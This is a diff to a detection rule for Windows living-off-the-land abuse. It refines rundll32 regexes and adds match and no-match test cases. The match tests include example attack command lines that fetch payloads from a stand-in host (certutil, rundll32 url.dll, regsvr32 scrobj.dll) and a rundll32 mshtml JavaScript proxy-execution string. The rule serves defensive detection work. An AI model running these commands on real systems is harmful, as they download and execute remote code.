@@ -21,7 +21,9 @@ detection:
           - "certutil(\\.exe)?.*(-urlcache|-f).*http"
           - "bitsadmin(\\.exe)?.*(/transfer|/addfile).*http"
           - "mshta(\\.exe)?.*(http|javascript:|vbscript:)"
-          - "rundll32(\\.exe)?.*(javascript:|http|\\.dll,)"
+          # rundll32 as a script / URL proxy (plain "rundll32 x.dll,Entry" is
+          # normal Windows behaviour and is handled by the path checks below).
+          - "(?i)rundll32(\\.exe)?.*(javascript:|vbscript:|https?://|mshtml,|runhtmlapplication|url\\.dll,|ieframe\\.dll,|shdocvw\\.dll,|advpack\\.dll,|setupapi\\.dll,installhinfsection|pcwutl\\.dll,|zipfldr\\.dll,routethecall)"
           - "regsvr32(\\.exe)?.*(/i:.*http|scrobj\\.dll)"
           - "regsvr32(\\.exe)?.*/s\\s+/u\\s+/i:"
           - "installutil(\\.exe)?.*/logfile=.*/u"
@@ -30,3 +32,37 @@ detection:
           - "\\b(cscript|wscript)(\\.exe)?.*\\.(vbs|js|wsf)"
           - "\\bcurl(\\.exe)?\\s+.*http.*-o"
           - "\\bpowershell.*\\b(iwr|invoke-webrequest|start-bitstransfer)\\b.*http"
+    # rundll32 loading a "DLL" with a non-DLL extension (loader trick).
+    - match:
+        field: process.command_line
+        op: regex
+        values:
+          - '(?i)\brundll32(\.exe)?["'']?\s+["'']?[^\s,"'']+\.(dat|tmp|txt|log|bin|db|ini|png|jpg|jpeg|gif|bmp|ico|cfg|xml|json)\b'
+    # rundll32 loading a DLL by path from outside System32 / SysWOW64 (bare
+    # DLL names resolve from System32 and are normal).
+    - all:
+        - match:
+            field: process.command_line
+            op: regex
+            values:
+              - '(?i)\brundll32(\.exe)?["'']?\s+["'']?[^\s,"'']*[\\/][^\s,"'']*,'
+        - not:
+            match:
+              field: process.command_line
+              op: regex
+              values:
+                - '(?i)\brundll32(\.exe)?["'']?\s+["'']?(%windir%|%systemroot%|[a-z]:\\windows)\\(system32|syswow64)\\'
+tests:
+  match:
+    - { artefact: evtx, process.command_line: "certutil.exe -urlcache -split -f http://evil.example/a.exe a.exe" }
+    - { artefact: evtx, process.command_line: "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";alert(1)" }
+    - { artefact: evtx, process.command_line: "rundll32.exe C:\\ProgramData\\x\\core.dll,Start" }
+    - { artefact: evtx, process.command_line: "rundll32.exe C:\\Users\\bob\\AppData\\Local\\Temp\\a.tmp,DllMain" }
+    - { artefact: evtx, process.command_line: "rundll32.exe url.dll,OpenURL http://evil.example/p.hta" }
+    - { artefact: evtx, process.command_line: "regsvr32 /s /n /u /i:http://evil.example/a.sct scrobj.dll" }
+  no_match:
+    - { artefact: scheduled_task, process.command_line: "%windir%\\system32\\rundll32.exe %windir%\\system32\\AppxDeploymentClient.dll,AppxPreStageCleanupRunTask" }
+    - { artefact: scheduled_task, process.command_line: "%windir%\\system32\\rundll32.exe Startupscan.dll,SusRunTask" }
+    - { artefact: evtx, process.command_line: "C:\\Windows\\system32\\rundll32.exe C:\\Windows\\system32\\shell32.dll,Control_RunDLL" }
+    - { artefact: evtx, process.command_line: "rundll32.exe sysmain.dll,PfSvWsSwapAssessmentTask" }
+    - { artefact: evtx, process.command_line: "C:\\WINDOWS\\SysWOW64\\rundll32.exe C:\\WINDOWS\\SysWOW64\\msi.dll,MsiInstallProduct" }
